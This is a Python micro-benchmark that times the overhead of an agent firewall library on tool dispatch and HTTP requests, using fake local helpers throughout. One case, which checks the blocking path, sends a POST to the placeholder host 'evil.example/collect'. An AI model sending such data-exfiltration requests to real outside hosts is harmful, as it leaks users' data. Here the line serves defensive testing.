"""Repo-local micro-benchmark for AgentFirewall decision-layer overhead."""

from __future__ import annotations

import io
import json
import platform
import statistics
import time
from dataclasses import dataclass
from urllib.request import Request

from agentfirewall import FirewallConfig, ReviewRequired, create_firewall
from agentfirewall.enforcers import GuardedHttpClient, GuardedToolDispatcher
from agentfirewall.exceptions import FirewallViolation
from agentfirewall.policy_packs import named_policy_pack


class NullAuditSink:
    """Drop audit entries to keep the benchmark focused on decision overhead."""

    def record(self, entry) -> None:
        return None


def _fake_http_opener(request, **kwargs):
    return io.BytesIO(b'{"status":"ok"}')


def _status_tool(*, message: str) -> str:
    return f"status:{message}"


def _shell_tool(*, command: str) -> str:
    return command


def _measure_ns(fn, *, iterations: int, warmup: int) -> list[int]:
    for _ in range(warmup):
        try:
            fn()
        except (FirewallViolation, ReviewRequired):
            pass

    samples: list[int] = []
    for _ in range(iterations):
        start = time.perf_counter_ns()
        try:
            fn()
        except (FirewallViolation, ReviewRequired):
            pass
        samples.append(time.perf_counter_ns() - start)
    return samples


def _p95_us(values_ns: list[int]) -> float:
    ordered = sorted(values_ns)
    index = max(0, int(len(ordered) * 0.95) - 1)
    return ordered[index] / 1_000.0


def _summary(values_ns: list[int]) -> dict[str, float]:
    return {
        "mean_us": round(statistics.fmean(values_ns) / 1_000.0, 2),
        "p95_us": round(_p95_us(values_ns), 2),
    }


@dataclass(slots=True)
class BenchmarkCase:
    name: str
    baseline: callable
    guarded: callable
    iterations: int
    warmup: int = 1_000


def build_cases() -> list[BenchmarkCase]:
    allow_policy = named_policy_pack("default", trusted_hosts=("api.openai.com",))
    allow_firewall = create_firewall(
        config=FirewallConfig(name="bench-allow"),
        policy_pack=allow_policy,
        audit_sink=NullAuditSink(),
    )
    allow_dispatcher = GuardedToolDispatcher(
        firewall=allow_firewall,
        tools={"status": _status_tool},
        tool_call_id_factory=lambda name, args, kwargs: "call_allow_status",
    )
    allow_http = GuardedHttpClient(
        firewall=allow_firewall,
        opener=_fake_http_opener,
    )

    review_firewall = create_firewall(
        config=FirewallConfig(name="bench-review"),
        policy_pack=allow_policy,
        audit_sink=NullAuditSink(),
    )
    review_dispatcher = GuardedToolDispatcher(
        firewall=review_firewall,
        tools={"shell": _shell_tool},
        tool_call_id_factory=lambda name, args, kwargs: "call_review_shell",
    )

    block_firewall = create_firewall(
        config=FirewallConfig(name="bench-block"),
        policy_pack=allow_policy,
        audit_sink=NullAuditSink(),
    )
    block_http = GuardedHttpClient(
        firewall=block_firewall,
        opener=_fake_http_opener,
    )

    return [
        BenchmarkCase(
            name="allow_status_tool",
            baseline=lambda: _status_tool(message="ready"),
            guarded=lambda: allow_dispatcher.dispatch("status", message="ready"),
            iterations=20_000,
        ),
        BenchmarkCase(
            name="allow_trusted_http",
            baseline=lambda: _fake_http_opener(
                Request("https://api.openai.com/v1/models", method="GET")
            ),
            guarded=lambda: allow_http.request("https://api.openai.com/v1/models"),
            iterations=15_000,
        ),
        BenchmarkCase(
            name="review_shell_tool",
            baseline=lambda: _shell_tool(command="ls"),
            guarded=lambda: review_dispatcher.dispatch("shell", command="ls"),
            iterations=10_000,
        ),
        BenchmarkCase(
            name="block_untrusted_http",
            baseline=lambda: _fake_http_opener(
                Request("https://evil.example/collect", method="POST")
            ),
            guarded=lambda: block_http.request(
                "https://evil.example/collect",
                method="POST",
            ),
            iterations=10_000,
        ),
    ]


def main() -> None:
    payload = {
        "python": platform.python_version(),
        "platform": platform.platform(),
        "notes": (
            "Repo-local micro-benchmark. Fake local helpers only; "
            "no real network, subprocess, or console logging."
        ),
        "cases": [],
    }

    for case in build_cases():
        baseline_samples = _measure_ns(
            case.baseline,
            iterations=case.iterations,
            warmup=case.warmup,
        )
        guarded_samples = _measure_ns(
            case.guarded,
            iterations=case.iterations,
            warmup=case.warmup,
        )
        baseline_summary = _summary(baseline_samples)
        guarded_summary = _summary(guarded_samples)
        payload["cases"].append(
            {
                "name": case.name,
                "iterations": case.iterations,
                "baseline_mean_us": baseline_summary["mean_us"],
                "baseline_p95_us": baseline_summary["p95_us"],
                "guarded_mean_us": guarded_summary["mean_us"],
                "guarded_p95_us": guarded_summary["p95_us"],
                "extra_mean_us": round(
                    guarded_summary["mean_us"] - baseline_summary["mean_us"],
                    2,
                ),
            }
        )

    print(json.dumps(payload, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()
